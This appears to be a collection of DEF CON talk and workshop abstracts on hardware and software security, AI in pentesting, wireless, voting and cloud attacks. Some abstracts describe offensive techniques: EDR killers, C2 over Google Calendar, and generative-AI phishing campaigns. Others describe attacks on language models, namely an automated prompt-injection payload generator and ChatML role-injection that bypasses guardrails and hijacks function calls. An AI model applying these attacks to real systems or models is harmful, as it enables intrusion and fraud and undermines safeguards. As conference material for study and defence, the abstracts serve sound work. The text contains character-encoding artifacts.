As software supply chains embrace transparency through SBOMs, hardware remains a black box. Yet the chips inside our IoT devices carry just as much â if not more â risk. From cloned components to opaque fabs, the semiconductor supply chain is fast becoming a national security flashpoint. Governments are scrambling to respond with blunt tools like bans and onshoring, but these approaches are slow, costly, and often impractical.  Traditional BOMs focus on procurement and production â what gets bought and assembled â but they rarely capture origin, integrity, or risk context. They werenât built to expose inter-organizational dependencies or detect supply chain manipulation.  Enter the HBOM Initiative â a new effort to bring visibility, traceability, and accountability to the hardware supply chain. By developing tools and practices for a hardware bill of materials (HBOM), we aim to expose hidden risks, trace chip provenance, and empower sectors to make smarter, risk-informed decisions without sacrificing adaptability or innovation.  This talk will explore why HBOMs are inevitable, what makes them hard, and how the hacker and security community can help shape the future of hardware trust.

SpeakerBio:  Allan Friedman, Adjunct Professor of Informatics at the Luddy School of Informatics, Computing, and Engineering at Indiana University
Dr. Allan Friedman is internationally recognized for leading the global Software Bill of Materials (SBOM) movement, transforming it from a niche idea into a widely adopted pillar of cybersecurity policy and practice.

La Inteligencia Artificial estÃ¡ dejando de ser una promesa futurista para convertirse en una herramienta tangible y poderosa en el presente de la ciberseguridad. En esta charla, presentamos un recorrido tÃ©cnico y estratÃ©gico por el impacto de la IA en el mundo del pentesting, centrÃ¡ndonos especialmente en el proyecto PentestGPT, una de las iniciativas mÃ¡s innovadoras en este campo.x000D
x000D
PentestGPT es un modelo que busca automatizar y asistir tareas tradicionalmente realizadas por humanos durante pruebas de penetraciÃ³n, desde el reconocimiento y la enumeraciÃ³n hasta la explotaciÃ³n de vulnerabilidades. Su funcionamiento se basa en una combinaciÃ³n de capacidades de procesamiento de lenguaje natural, razonamiento contextual y un conocimiento actualizado de vectores de ataque y tÃ©cnicas ofensivas. MÃ¡s que una herramienta, se estÃ¡ convirtiendo en un copiloto para analistas de seguridad, reduciendo los tiempos de anÃ¡lisis, potenciando la documentaciÃ³n tÃ©cnica y permitiendo que los profesionales puedan enfocarse en lo estratÃ©gico y no solo en lo operativo.x000D
x000D
A lo largo de la charla analizamos las capacidades actuales de la IA aplicada al pentesting, asÃ­ como sus limitaciones, sesgos y riesgos de uso. Discutimos escenarios donde PentestGPT puede aportar verdadero valor (por ejemplo, en entornos con recursos limitados o como apoyo en red teams), y tambiÃ©n advertimos sobre los peligros de una confianza ciega en la automatizaciÃ³n. Asimismo, abordamos casos reales de uso, ejemplos prÃ¡cticos y demostraciones que ilustran cÃ³mo interactuar con este tipo de sistemas.x000D
x000D
Pero esta charla no es solo sobre herramientas. Es una invitaciÃ³n a reflexionar sobre cÃ³mo se redefine el rol del pentester frente a estas tecnologÃ­as, cÃ³mo impacta en las metodologÃ­as tradicionales y quÃ© desafÃ­os Ã©ticos y tÃ©cnicos se presentan al incorporar inteligencia artificial a procesos ofensivos. Â¿Hasta dÃ³nde podemos delegar? Â¿QuÃ© responsabilidad tenemos como profesionales al utilizar estos sistemas?x000D
x000D
Presentada por 2 lÃ­deres de seguridad en Argentina, esta sesiÃ³n busca abrir el debate, compartir experiencia prÃ¡ctica y aportar una mirada crÃ­tica sobre el presente y futuro del pentesting en la era de la IA. Una charla pensada tanto para quienes ya estÃ¡n explorando estas tecnologÃ­as, como para quienes reciÃ©n comienzan a preguntarse quÃ© lugar ocuparÃ¡n en su dÃ­a a dÃ­a profesional.

Description:
The CVE Program has been a cornerstone of cybersecurity for over two decades, but its original design was never meant to support AI-discovered vulnerabilities, real-time coordination, or global software supply chains. The CVE Program has evolved from a technical utility to become a pillar of public cybersecurity policy. As governments craft regulation around vulnerability disclosure, product security, and software liability, the CVE system is increasingly at the center of the conversation, but innovation in vulnerability discovery has outpaced innovation in vulnerability tracking, lagging behind the needs of policy, industry, and international coordination.  

This panel will explore how public policy can promote innovation within the CVE Program to meet growing global expectations. Topics will include how AI and automation can modernize disclosure at scale, how CVE labelling can evolve with emerging technologies, and how solutions must address the risk of fragmentation (national vulnerability databases and duplicative disclosure systems) to be future proof.

Last year, we introduced the Warflying project - collecting information about wireless access points from a small airplane. This presentation will share our ongoing research, including things we have learned about the sniffing process and the impact of improved equipment, along with enhanced data analysis and visualizations to continue attempting to answer questions like âHow many access points can you actually pick up from an airplane?â, âIs warflying better than wardriving or warbiking or warwarlking or warswimming?â, âShould I run WiGLE on my phone during my airline flight?â, âAre the airplanes flying overhead monitoring my WiFi?â, and âWhy are you even doing this?â

You just arrived in some city where the enemy is active. You have a mission to locate and identify a hostile team. They operate in and around a hotel adjacent to friendly force headquarters. They use radios to talk, rented cars to move, local Wi-Fi to conduct operations, and Bluetooth for everything else. Your phone just buzzed with a message that screams "They're planning something today. You have one hour to find them so we can direct local law enforcement. Go!" You just realised your equipment bag never made it off the plane. Bad. There is nowhere nearby to get what you need to do RF work in one hour. Worse. You happened to stuff your Flipper Zero into your pocket. Good? It's what you have and it can work on all that enemy tech--let's power it up and get at the mission. Better than nothing, right? Go!

Description:
Effective phishing campaigns traditionally demand extensive manual effort, involving detailed target reconnaissance, crafting believable scenarios, and setting up infrastructure. These manual processes significantly restrict scalability and customization. This talk explores a practical approach to leveraging Generative AI for automating core aspects of phishing workflows, drawing on direct experiences and real-world threat actors such as Emerald Sleet, Crimson Sandstorm, and Charcoal Typhoon.

The session thoroughly compares results from different models and platforms, including OpenAI ChatGPT, Anthropic Claude, and local alternatives, highlighting distinct strengths, weaknesses, and techniques for optimizing outcomes. Attendees will gain insights into deploying an end-to-end phishing campaign, emphasizing the models' effectiveness in reducing the technical barrier of scaling phishing attacks. Finally, the talk underscores that while AI significantly enhances operational efficiency, it functions best when complemented by human judgment and expertise, reinforcing the critical human factor in cybersecurity practices.

Description:
Using the Dominion touchscreen BMD debuted at Voting Village 2023, we will discuss and demonstrate in real-time how technically simple "hacks" to the ballot displayed on the voterâs touchscreen can directly impact the vote count, or alternatively impact the voterâs decisions. These simple âhacksâ to the election definition (with no need to inject malware) include the manipulation of display of candidate choices, silent removal of candidates from the display, and using false instructions on the touchscreen to intentionally misinform voters regarding candidates or ballot questions. Furthermore, attempting to determine/recover from such hacks on the election outcomes can range from difficult to impossible. In addition to discussing the tactics and potential impacts, we will illuminate underlying system design decisions which enabled such hacks to be technically simple, feasible, and easily executable. The knowledge and tools used/discussed were obtained through public means and public websites, available to an unlimited number of people. This talk will focus on the general methodology and ease of the vote manipulation, the range of impacts, the feasibility and scalability. Immediately following the on-stage presentation, a deeper dive into the technical aspects will occur in the adjacent Voting Village lab room.

Description:
Cybersecurity is currently in a state of crisis, and it is imperative that we confront this issue head-on. The increasing aggressiveness and sophistication of adversaries is not the primary concern; rather, our approach to tackling these threats is a significant part of the problem. In the realm of defending against cyberattacks, it is not the probabilities that count, but rather the actions we take. Many well-known cybersecurity tools from both large enterprises and startups often fail to deliver on their promises or provide misleading, if not outright fraudulent, data. The notion that vendors frequently misrepresent their capabilities is, as the saying goes, "a tale as old as time." However, the idea that these vendors may be so convincing because they genuinely believe in their own fabrications is particularly thought-provoking. In this discussion, we will delve into the realities surrounding cybersecurity vendors, certifications, and a range of other contentious topics within the cyber domain. If youâre ready for a honest look at the state of cyber, this session is for you.

Description:
Modern websites have evolved into complex, layered network architecturesâcreating fertile ground for serious protocol-level vulnerabilities that traditional tools often overlook. As web applications continue growing in complexity, critical vulnerabilities such as HTTP smuggling, first-request routing, and cache poisoning/deception become increasingly prevalent, underscoring the need for tooling that treats HTTP as it truly is: a stream-based protocol. 

Although security professionals commonly rely on HTTP proxies to intercept, analyze, and manipulate traffic, most current solutions obscure the stream-oriented nature of the protocol. By presenting HTTP interactions merely as isolated request-response transactions, crucial detailsâlike persistent connections, pipelining, and geo-routingâare concealed, making it difficult to fully comprehend data flows or uncover advanced attack vectors. 

In this session, Iâll present a new Burp extension to dive deep into the raw streams powering HTTP, turning overlooked details into powerful exploits. Youâll learn how to spot hidden proxies, exploit subtle errors to desynchronize connections, hijack requests, and uncover vulnerabilities that evade traditional tools. Through real-world case studies, Iâll reveal exactly how you can chain advanced HTTP Desync attacks to secure bounties that others have left behindâtransforming complex network architectures into your own bug bounty playground!

Description:
Federated Credentials are one of the ways to authenticate workload identities and provide access to resources using Open ID Connect (OIDC), and major identity providers such as Entra ID (formerly known as Azure AD) support authentication using federated credentials. Developers set up a trust relationship between federated identity providers and workload identities. Often times due to a misconfiguration or lack of understanding of federated credentials security risks, developers have dangling domains configured as issuer in the setup. Due to the inherent trust relationship configured with the federated identity provider, an attacker can take over the dangling issuer domain, host OIDC discovery endpoints and obtain access tokens to elevate privileges. 

 This talk aims to highlight the risks of dangling issuers and demonstrates how an attacker can exploit them to elevate privileges. In addition, the talk also covers mitigations and best practices and provides tools to identify these misconfigurations.  The demos used in this session leverage Microsoft Entra ID as the identity provider and Azure as the cloud hosting platform. However, the key takeaways are generic and are applicable to other cloud environments and identity providers.


Key concepts covered in the talk are as follows: 
1.        Introduction 
      a.        Speaker intro
      b.        Overview of federated credentials in Entra ID (Azure AD) & other identity providers

Description:
Information stealer malware is one of the most prolific and damaging threats in todayâs cybercrime landscape, siphoning off everything from browser-stored credentials to session tokens. In 2024 alone, we witnessed more than 30 million stealer logs traded on underground markets. Yet buried within these logs is a goldmine: screenshots captured at the precise moment of infection. Think of it as a thief taking a selfie mid-heist, unexpected but convenient for us, right? Surprisingly, these crime scene snapshots have been largely overlooked until now. Leveraging them with Large Language Models (LLMs), we propose a new approach to identify infection vectors, extract indicators of compromise (IoCs) and track infostealer campaigns at scale. In our analysis, we will break down three distinct campaigns to illustrate their tactics to deliver malware and deceive victims.

With its live demonstration, this presentation shows how LLMs can be harnessed to extract IoCs at scale while addressing the challenges and costs of implementation. Attendees will walk away with a deeper understanding of the modern infostealer ecosystem and will want to apply LLM to any illicit artifacts to extract actionable intelligence.

The accelerating evolution of technology, specifically AI, has created a "meta-system" so complex and intertwined with all domains of knowledge and human life that it effectively operates on a meta-level, shaping our reality and exceeding our control. The meta-system requires collaboration among all of its parts for effect management. We need to think on a meta-level because the meta-system is thinking about us in its own unique terms. We must adopt a "hacker" mindset â thinking critically, creatively, collaboratively, and systematically â to navigate this new reality.

Description:
Encrypted radios promise off-grid privacy and security, but what if their core trust anchors can be broken with one message? Our latest research shows that a single, unauthenticated RF packet can overwrite any public keys goTenna Pro stores for peer-to-peer and group chats, silently substituting attacker-controlled keys so that every AES-256 encrypted message is now readable only to the attacker, not the intended recipient; by repeating the swap on both ends the attacker becomes an undetectable man-in-the-middle who alone can forward, alter, or drop traffic, leaving victims blind to compromise. We will live-demo three outcomes: pulling teams into GPS dead zones by injecting phantom coordinates; impersonating a surveillance teammate to feed disinformation and fracture cohesion; and detonating a network-wide blackout that forces operators onto weaker radio communication that allows easy direction-finding. The audience will watch us craft the packet, poison key stores, pivot between victims, and restore normalcy - all from commodity SDR hardware and open-source code released at the session. We close with a hardening guidance and a patch in goTenna Pro version 2.0.3 (CVE-2024-47130) proving once again that cryptography is only as strong as the key lifecycle surrounding it.

Description:
FIDO2 is the de-facto standard for passwordless and 2FA authentication. FIDO2 relies on the Client-to-Authenticator Protocol (CTAP) to secure communications between clients (e.g., web browsers) and authenticators (e.g., USB dongles). In this talk, we perform a security assessment of CTAP and its Authenticator API. This API is a critical protocol-level attack surface that handles credentials and authenticator settings.

We investigate the standard FIDO2 setup (credentials stored by the relying party) and the most secure setup, where credentials are stored on the authenticator, protected from data breaches. We find that FIDO2 security mechanisms still rely on phishable mechanisms (i.e., PIN) and unclear security boundaries (e.g., trusting unauthenticated clients).

We introduce eleven CTRAPS attacks grouped into two novel classes: Client Impersonation and API Confusion. These attacks exploit CTAP vulnerabilities to wipe credentials, perform unauthorized factory resets, and track users.
Our open-source toolkit implements the attacks on two Android apps, an Electron app, and a Proxmark3 script, supporting the USB HID and NFC transports. In our demos, we show how to use our CTRAPS toolkit to exploit popular authenticators, like YubiKeys, and relying parties, like Microsoft and Apple.

Description:
Prompt injection is an emerging and poorly standardized attack vector targeting large language model applications. Unlike traditional vulnerabilities, there is no universal testing methodology or tooling, making it difficult for penetration testers to assess the security posture of LLM-integrated systems. Matrix Prompt Injection Tool aims to fill this gap by automating the generation of diverse prompt injection payloads. [1] Dynamic Input Detection: MPIT scans target websites to identify expected input fields where LLMs might process user requests. [2] Payload Enrichment: Each pattern includes crafted elements such as exploit strings, delimiters, and reasoning cues, enhancing the quality of the penetration test. [3] Genetic Algorithm Optimization: The tool employs a genetic algorithm to evolve and refine injection patterns, increasing their success rate significantly across different LLM defenses. [4] Practical Utility for Pentesters: MPIT is designed to support real-world offensive security assessments, making LLM-targeted testing more feasible and effective. ShinoLLMApps is a collection of vulnerable LLM web applications that use RAG and tools to help you test MPIT and better understand prompt injection and its risks.

Description:
Apple Find My is a crowdsourced offline tracking network designed to assist in recovering lost devices while maintaining privacy. By leveraging over a billion active Apple devices, it has become the world's largest device-locating network. While prior research has demonstrated the possibility of creating DIY trackers that attach to the Find My network, they are mainly for personal use and do not pose a threat for remote attacks. Recently, we found an implementation error in the Find My network that makes it vulnerable to brute-force and rainbow table attacks. With a cost of a few US dollars, the exploit turns computers into trackers without requiring root privileges. We are concerned that adversaries and intelligence agencies would find this exploit handy for user profiling, surveillance, and stalking. This demo is especially appealing to those interested in Find My network and Bluetooth tracking technologies. We will review how Find My offline finding works, elaborate in detail about our discoveries, techniques to make practical attacks, and provide source code for fun.

Description:
I will cover the tools available in the corporate network, the limitations of remote investigations, and the signatures of threat actors.  All examples are cases I have actively worked in the past two years.  This will range from the individual threat- timecard fraud identified thru network logs which led to the geolocation of an automated fingerprint device hidden in a facility to large numbers of contractors working in denied areas  to ultimately the identification and mitigation of North Korean IT worker fraud within the network.  1. Speaker intro and brief background  1. On-site contractor must be on site daily between 9-5 but there was little work. They connected an older generation iPhone to the visitor network and hid it within a box in a cubicle away from foot traffic.     1. The device had the timecard app for $company which required a manual fingerprint touch/swipe geolocated to the customer site daily.     2. The contractor automated a device to have a synthetic flesh covering over a robotic finger which would press log in at 0900 and logout at 5pm monday-friday     3. The device was discovered by janitors and assumed to be an explosive device at first     4. Picture analysis revealed the make/model of the iPhone     5. I gained access to the visitor Wifi logs, found the MAC address of the iPhone/device name (named $contractor name) and the traffic going to the contractor timesheet website  Other devices were also found with similar configurations for the user and his managerâ¨â¨2.How I was introduced to the IoT village thru chip off extraction of Chinese voting machine in 2022 by the IOT experts            Description of voting machine prototype from china      4g connectivity, bluetooth, wifi but no true data ports for analysis        Chip off extraction by IoT village (videos)         end result of the analysis and where the images went for national security      3. North Korean IT Fraudulent worker hunting         1. Micro level- piKVM switch hunting on individual network detection level, now turned to an email alert via date ubea         2. Hints and clues via digital forensics- devices added to the workstation that are not related to the users                 1. Kimâs iPhones connecting to Georgeâs virtual machine                 2. Multiple user devices (verified thru MAC address) connecting to the same workstation                 3. Timecards being updated in HR systems in beijing/NK time zone on emulators                      1. Can see itâs a linux device android phone whereas most legitimate users are either android or iPhone. Connecting to Wifi VPN router for all connections and forgetting 2fa is tied to the local infrastructureâ¨â¨â¨4. User was being terminated from company A as a fraudulent worker and company B/C screens were in the background. With the screen shot time provided by our partner, I executed a windows event code search in splunk for devices locked within the window of the termination from company A. We ultimately found a full stack dev fitting the description of NKIT suspects with an Astrill VPN. While hunting for this user, we identified one working out of China and spoofing their location.  The humint interview, while far from the iOt arena, revealed the userâs deception as they would not open the windows locally to prove they are in the same geographic time zone

This talk explores the importance of implementing robust access controls in GraphQL and REST APIs and the severe consequences when these controls are not properly enforced. GraphQL, a flexible data query language, allows clients to request exactly the data they need, but without proper access control mechanisms, sensitive data can be easily exposed. Using the Feeld dating app as a case study, we will dive into a critical security review of how the lack of access controls in GraphQL and REST endpoints led to the exposure of users' personal data, including sensitive photos, videos and private messages. This session will highlight common access control vulnerabilities in GraphQL and REST implementations , real-world examples of security lapses, their impact and remediation.

        We dive into a critical security review of the Feeld dating app.

        Feeld, known for its unique features that cater to a wide range of preferences and relationships, unfortunately had serious security vulnerabilities that exposed users' private data, including sensitive photos and personal information.

        Here's what we uncovered:
        1- Profile information was accessible to non-premium users.
        2- Other people's messages could be read without proper authentication.
        3- Photos and videos from chats were exposed unauthenticated.
        4- The ability to delete, recover, and edit other people's messages.
        5- Profile information could be updated by anyone.
        6- Unauthorized likes from any profile.
        7- Messages could be sent in other users' chats.
        8- Viewing others' matches without permission.

Description:
State and local governments (SLTTs), small and medium-sized businesses (SMBs), and nonprofits across the United States are routinely targeted by cyber criminals and nation-states. The societal impacts of those cyber attacks are significantâthey force schools to close, hospitals to postpone patient treatment, courts to delay proceedings, and disrupt municipal services. 

One way they improve their resilience is by outsourcing some of their information security responsibilities. IT managed service providers (âMSPsâ), managed security service providers (âMSSPsâ), and other information security service providers can provide a long-term option for high-risk communities to improve their resilience. But not all ITSSPs are created equal - how good are these organizations, really, at protecting small organizations? How affordable are they, and how good are their services? 

As part of the Cyber Resilience Corps initiative, Michael Razeeq and Grace Menna interviewed around 20 organizations, including MSPs, MSSPs, IT and cybersecurity consultancies, and their clients, to identify challenges to expanding service provider support to more high-risk communities. This talk will present key findings from their research and policy recommendations to expand service provider coverage across high-risk communities we depend on.

Description:
Meshtastic has exploded in popularity as the go-to off-grid, multi-mile, low-power LoRa mesh for hikers, hackers, and preppers, though most users never peek beneath its phone app. This talk rips the protocol open from the radio chirp visible in inspectrum all the way to lines in Wireshark, showing exactly how every byte travels from a solar-powered node on a mountaintop to your screen.

Using an SDR, a GNU Radio flowgraph, and a sprinkle of Python, we peel back each layer: how the radio forms its chirps, how the mesh hops frames across nodes, and what exactly is tucked inside the Protobuf envelope and its AES-256-sealed core.

The exploration does not end with passive listening. Short, standalone snippets demonstrate how to craft and transmit valid frames, proving that a few lines of code are enough to speak Meshtastic. No mobile app or heavyweight firmware required.

Attendees will leave with a repeatable SDR and GNU Radio workflow for decoding any Meshtastic channel, copy-ready Python examples for both receiving and sending traffic, and a clear mental model of the entire stack from physical layer to application payloads. Whether you are RF-curious with a forty-dollar RTL-SDR dongle or a seasoned signals wrangler hunting for a new playground, this talk equips you to see and speak the language of Meshtastic.

Allan wrangles cloud infrastructure by day, and radio waves by night. An early SDR devotee from the sub-$20 RTL-SDR era, he can often be found between a hex editor and an FFT waterfall, tinkering with the invisible.

Description:
Modern vehicles have evolved into sophisticated, internet-connected computing platforms with attack surfaces spanning cloud infrastructure, telematics systems, and over-the-air update mechanisms. With the automotive industry generating over $11 billion in cyberattack losses in 2023 alone, security researchers struggle to comprehensively map connected vehicle ecosystems using traditional OSINT methodologies that lack automotive-specific knowledge. This presentation introduces a systematic OSINT methodology designed for automotive threat intelligence, combining conventional reconnaissance techniques with automotive-focused discovery methods to identify exposed automotive APIs, misconfigured cloud infrastructure, vulnerable telematics endpoints, and supply chain weaknesses that standard assessments typically miss. Through live demonstrations using real automotive manufacturer targets, attendees will learn to adapt existing OSINT tools like Shodan, Censys, and certificate transparency logs with automotive-focused data sources to build complete attack surface maps of connected vehicle ecosystems. Participants will gain practical skills for discovering OTA update infrastructure, fleet management systems, and connected vehicle APIs while learning to transform raw reconnaissance data into actionable automotive threat intelligence that can be immediately applied whether entering the automotive security space or expanding traditional pentesting expertise into the rapidly growing connected vehicle market.

Description:
The US Digital Millennium Copyright Act (DMCA) broadly prohibits defeating technical measures used to protect copyrighted material, including software. Unfortunately, this can encompass ordinary reverse-engineering and other techniques routinely employed by researchers to examine software-based systems for security vulnerabilities. In 2017, the US Copyright Office enacted a temporary exemption permitting "good faith security research" under some circumstances. This talk will explore what conduct the exemption does and doesn't cover, and how the exemption helps protect the ability for election security researchers to do their work. The talk will include generous time for questions.

Description:
Attributing cyber threats to a specific nation-state remains one of the most complex challenges in cybersecurity. Cyber attribution relies on analyzing digital artifacts, infrastructure patterns, and adversary tactics, none of which provide definitive proof on their own. Threat actors continuously evolve, adopting new methodologies and obfuscation techniques that make attribution increasingly difficult. Over the past decade, North Koreaâs cyber operations have transformed from rudimentary attacks into highly sophisticated campaigns that rival the capabilities of established cyber powers. Initially, DPRKâs cyber program consisted of loosely organized groups with limited technical capacity, but today, these actors operate under a structured, state-controlled framework with clear strategic objectives. This research presents an in-depth analysis of how DPRK threat actors have adapted, restructured, and collaborated, shedding light on the complexities of nation-state attribution.

Description:
The new space race is here and as space systems become more interconnected and commercially accessible, their attack surface expands, making them prime targets for cyber threats. Yet, most organizations developing and operating satellites rely on traditional security models, if at all, that do not account for the unique risks of space-based assets. This talk explores the emerging discipline of space red teaming, where offensive security techniques are applied to test and validate the security of satellites, ground stations, and their supporting infrastructure.

In this talk we explore the following:

Understanding the space attack surface: 
- A breakdown of key vulnerabilities in spacecraft, radio links, and ground control.
- Tactics, Techniques, and Procedures (TTPs): How attackers might compromise a space asset, disrupt communications, or manipulate telemetry.
- Defensive takeaways: How space operators can leverage red teaming to harden their architectures against real-world threats.

This presentation is ideal for penetration testers, security researchers, space engineers, and policy makers who want to understand the offensive side of space security. Whether youâre an experienced red teamer or just a space junky, this talk will provide practical insights into securing the next frontier.

Description:
Rapid advancements in AI raise important concerns about cybersecurity risks. While existing work shows AI still falls short of human expertise in cybersecurity, we aim to identify indicators of emerging capabilities and risks by studying the gap between AI and expert human performance. We compare top hackersâselected for their proven track record in security research and competitionsâwith AI systems attempting to exploit real and synthetic targets. This comparison helps us pinpoint where current frontier model evaluations fall short, what tacit knowledge is needed to exploit vulnerabilities effectively, and how these gaps might be addressed. By distilling the expertise, intuition, and problem-solving approaches that make human experts more effective than current foundation models, we highlight the unique skills that continue to differentiate human practitioners. Conversely, we seek to identify areas where AIâs latent capabilities may offer distinct advantages, helping experts better leverage these tools in their work. Our work aims to improve AI cybersecurity evaluations, address critical gaps in evidence-based policymaking, and better equip practitioners to adapt to shifts in the offense/defense landscape.

Description:
Large-language-model wrappers increasingly rely on the âChatMLâ format to segregate system, assistant, and user roles, yet those delimiters introduce a critical appsec flaw: there is a role hierarchy but no ChatML/server-side RBAC or parameter-level trust boundary built in to ChatML or its chat-completions JSON wrapper. Any client that can speak ChatML can also impersonate privilege, similar to the logical flaws of early-2000s webapps. To make it worse: everybody and their mother forked this thing with roles/privileges but no built-in RBAC pioneered by leading model providers.

In twenty minutes we will walk through the anatomy of that oversight and unveil three vendor-agnostic role-injection techniques that bypass guardrails, trigger unbounded consumption, and hijack function calls in under 50 tokens. We then pivot to parameter pollution, showing how key overrides (temperature, system, tools) can be further used to abuse agents.

Description:
Through novel research our team uncovered a critical vulnerability in Azure's guest user model, revealing that guest users can create and own subscriptions in external tenants they've joinedâeven without explicit privileges. This capability, which is often overlooked by Azure administrators, allows attackers to exploit these subscriptions to expand their access, move laterally within resource tenants, and create stealthy backdoor identities in the Entra directory. Alarmingly, Microsoft has confirmed real-world attacks using this method, highlighting a significant gap in many Azure threat models. This talk will share the findings from this first of its kind research into this exploit found in the wild.

We'll dive into how subscriptions, intended to act as security boundaries, make it possible for any guest to create and control a subscription undermines this premise. We'll provide examples of attackers leveraging this pathway to exploit known attack vectors to escalate privileges and establish persistent access, a threat most Azure admins do not anticipate when inviting guest users. While Microsoft plans to introduce preventative options in the future, this gap leaves organizations exposed to risks they may not even realize existââbut should definitely know about!

In this tutorial, we will go over two technologies for ensuring access pattern privacy, including Oblivious RAM (ORAM), and Private Information Retrieval (PIR). Unlike traditional encrypted databases that protect only the contents of data, our technologies additionally protect the queries, thus hiding users' intentions. We will describe two extremely simple constructions, one ORAM, and one PIR scheme. In particular, the ORAM algorithm is also the one used by industry leaders such as Signal and Meta. We will next show a demo for our oblivious key-value store implementation.

Description:
This talk revisits Google Calendar RAT (GCR), a proof-of-concept released in 2023 by the speaker, demonstrating how Google Calendar can be abused for stealthy Command&Control (C2) communication. A similar technique was recently observed in the wild, used by the APT41 threat group during a real-world campaign, which highlights the growing interest in abusing trusted cloud services for covert operations.

Building on that concept, the talk introduces a new Golang-based tool that enables SOCKS tunneling over Google services, establishing covert data channels.

The session explores how common cloud platforms can be repurposed to support discreet traffic forwarding and evade traditional network monitoring. While some familiarity with tunneling and cloud services may be helpful, the talk is designed to be accessible and will walk attendees through all key concepts.

Whether you're a penetration tester, red teamer, or simply curious about creative abuse of cloud infrastructure, youâll leave with fresh ideas and practical insights.

Description:
Residential solar promises energy independence, but behind the panels lies a chaotic mess of insecure firmware, exposed APIs, and rebadged devices phoning home to mystery servers. This talk exposes how today's solar microgrids can be hijacked through unauthenticated cloud APIs, unsigned firmware updates, hardcoded root credentials, and even vendor-enabled kill switches. No custom exploits. No insider access. Just publicly documented APIs, leaked serial numbers, and a shocking lack of basic security controls.

We will walk through real-world attacks, account takeover via brute-forced PINs, remote access to power dashboards with zero authentication, firmware tampering for persistent implants, and replay attacks against plaintext MODBUS traffic. Our research reveals how vulnerabilities silently propagate across cloned OEMs and shared cloud infrastructure, turning a single bug into an industry-wide risk. If you thought solar made you off-grid, this talk will change your threat model.

Description:
When the first measurement studies of the GFW came out in the early 2000s, computation and power consumption were 30,000X greater than they are today. Because of this, Chinaâs GFW resided deeper in the network and further away from homes and data centers. The substantial increase in computational efficiency has made processing and filtering in-path and near connection end-points viable while the volume of network traffic in todayâs Internet has made this design a virtual necessity. Russiaâs censorship apparatus, the TSPU, has emerged as a state-of-the-art system, on par with the GFW, and a potentially more significant threat, particularly for users of Russian apps and data centers. There are two reasons for this. First, Russiaâs design, which places censors in-path and closer to end-hosts (residential modems and data center connections), permits more granular, targeted attacks. Second, according to the Russian government, sanctions have compelled them to build their own certificate authority and require all Russian software to trust this certificate authority. Combining these two factors implies major threats to users interacting with Russian data centers and software. Fortunately, research has identified cases where the TSPU can be circumvented. New tools based on these ideas could be the future of circumvention.

Censorship of VPNs today, link

SpeakerBio:  Benjamin "bmixonbaca" Mixon-Baca
I am a security researcher focused on Internet Freedom, censorship circumvention, and pwning middleboxes, firewalls, and other devices that are supposed to keep me "safe". I have developed attacks against VPN software. The one relevant to this presentation is CVE-2021-3773. This vulnerability affects VPNs but is actually because of issues in the firewall/connection tracking framework (e.g., Netfilter) of the underlying OS running the VPN. An attacker can use this vulnerability to redirect packets in various ways and can even let an attacker escalate from adjacent to-in-path between the victim and VPN server. I applied insights I gained while developing this attack to testing the TSPU and was able to develop bypass strategies. This is because the underlying design of connection tracking frameworks, such as how they track TCP states and direction, is basically the same for both network layer VPNs like OpenVPN and WireGuard and firewalls like the TSPU.

Description:
Many cybercime and APT actors kill and/or silence EDR agents in order to evade detection, allowing them to achieve their actions on objectives without notifying security teams. How do they do it? What tools do they use? How do they write those tools? What is BYOVD? If youâre interested in learning how adversaries bypass EDR platforms, this workshop is for YOU!

Every student who attends this workshop will have a personal lab environment generated for them. Using the online lab environment, students will review a live EDR tool in order to become familiar with its capabilities, logging, and more. Students will then compile and run an EDR killer used commonly by major threat groups. Next, students will execute commands to silence agent-to-tenant communication, thereby negating notification to security teams.

Following the building, use, and analysis of readily-available tools, students will learn how to write their own code to achieve similar means. We will be using a combination of pre-provided code snippets and code we write in real-time in order to both kill and silence the provided EDR agent. Are you ready to take your reverse engineering and coding skills to the next levels? â Letâs do this! And remember: #RansomwareSucks!

Description:
There is a creature that lives inside our smartphones, laptops, and PCs, quietly driving their most cutting-edge behaviors. Much larger versions of it hide in datacenters around the world, constantly crunching through massive computation problems. And yet, even experienced engineers find it mysterious. Originally made to boost graphics performance, it has evolved into the engine that powers technologies behind systems like Claude and ChatGPT. In this workshop, we will uncover the nature of this creature: the GPU. Starting with its history and evolution, we will explore how a processor meant to accelerate 3D graphics became the driving force behind modern machine learning and AI. Along the way, we will dive into the design and behavior of neural networks, and discover how a machine built for graphics rendering learned to interpret images and speak human language. Finally, we will investigate how the complexity of neural networks made possible by GPUs can lead to unexpected and strange behaviors... some of which may not be accidental.

Description:
The Internet is a dangerous place. Fortunately, hackers have created tools to make it safer. VPNs anonymize traffic but still expose IP addresses. Companies claim not to log, but how quickly will they hand over our data when they receive a warrant? Tor networks reroute traffic, but performance suffers as a result. Can we trust these distributed networks? Who owns the exit nodes? Finally, apps like Signal offer E2EE secure comms but in a proprietary and siloed way. Open source means very little if an app operates in a Walled Garden. Are there back doors? Is our data really safe?

In this workshop we'll create a Hacker VPN that combines the best of VPNs, Tor, and E2EE secure comms apps. We'll use modern-day PQC encryption to implement a secure protocol. We'll use both TCP/UDP as our network protocols to demonstrate flexibility in design. We'll support packet sharding, random noise injection, multi-hop routing, and 100% anonymity between network endpoints. We'll do all this on Linux with standard C++, CMake & OpenSSL. At the end of this workshop you'll have all the tools you need to take the Hacker VPN to the next level. Why trust outdated software from shady companies when you can build your own modern day, kick-ass implementation?

Yes, the Internet is a dangerous place. But it's much safer when we take control.

From there, he moved on to DOS on a Packard Bell and eventually to building custom systems. That early hands-on experience evolved into a career spanning multiple industries and roles, where he designed, deployed, and managed complex networks and systems. While hardware remains a passion, his current work focuses on secure communications and building tools for resilient network infrastructure. When heâs not buried in RFCs, technical docs, or writing integrations, Benjamin is likely rock climbing or exploring underwater cave systemsâboldly going where no man has gone before.

Tags: DEF CON Workshop |  | Intermediate
When: Saturday, Aug 9, 14:00 - 17:59 PDT
Where: LVCC North-Level 2-N258 (Workshops) - Map

Description:
This workshop is designed to give students the skills they need to identify and defeat common evasion techniques used by malware. Itâs broken up into three hands-on modules where students will work with a range of open-source (or otherwise free) tools to dig into malicious code, examine different evasion techniques, and learn how to circumvent them to better understand how the malware operates.
Weâll be using a mix of instructor-created malware samplesâwith full source code provided so students can analyze both the binary and the code side-by-sideâand real-world samples found in the wild. By the end of the workshop, students will walk away with several malware samples, pages of code to keep digging into on their own, and a solid toolkit of techniques for breaking through typical anti-analysis and evasion tricks used in modern malware.

